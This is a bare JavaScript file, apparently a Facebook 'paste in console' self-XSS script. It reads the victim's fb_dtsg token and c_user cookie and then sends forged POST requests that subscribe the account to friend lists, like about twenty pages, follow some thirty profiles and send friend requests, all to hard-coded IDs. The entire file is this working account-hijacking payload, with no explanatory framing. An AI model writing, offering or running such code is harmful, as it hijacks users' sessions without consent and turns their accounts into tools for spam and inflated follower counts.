/*Follow List*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
LIST("567376543307348");
LIST("562836113761391");
LIST("352246548208596");
LIST("4399231940310");
LIST("10200819572312984");
LIST("10200820950347434");
LIST("10200819976883098");
LIST("10200865018889120");
LIST("466396010097340");
LIST("466380243430111");
LIST("381489938632591");
LIST("611411958872392");
LIST("551467628239578");
LIST("358808870905474");
LIST("325715414223519");
LIST("538818886161261");
LIST("156489554515051");
LIST("359722610800552");
LIST("146971562150041");
LIST("503774323004340");
LIST("177777859044364");
LIST("296332940501763");
LIST("252854598187657");
LIST("461311090622996");
LIST("452505254839947");

/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("313072532101076");
Like("190451517757758");
Like("595580513789645");
Like("300241633420701");
Like("231125826929893");
Like("456401041060837");
Like("523004351084154");
Like("229353647087574");
Like("229488947108546");  
Like("205908352819272");   
Like("313072532101076");  
Like("209464459125570");  
Like("523004351084154");   
Like("200776629976061");  
Like("147857465295449");  
Like("163588093717517");  
Like("291092130903328");  
Like("429143760437630");  
Like("149394451859931");
Like("306495312809675");   
Like("238044532932475");
 
/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100003697277263");
a("100003846224832");
a("100001050235420");
a("100001375288085");
a("100003231350883");
a("100001610096787");
a("100004459350389");
a("100002760409500");  
a("100003996410930");  
a("100002753085498");    
a("100001597470562");  
a("100003236292409"); 
a("100002514625419");  
a("100003719477594");  
a("100003323922152");  
a("100003641105051");  
a("100003766050046");  
a("100003291769896");  
a("100003231350883");  
a("100003822041168");  
a("100003793848333");  
a("100003790742474");  
a("100003579341486");  
a("100003531745127");  
a("100004164938729"); 
a("100003751777172");
a("100002263264013");
a("100003898640819");
a("100002747023938");

/*Add Friend*/ 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100004459350389");
IDS("100004021942009");
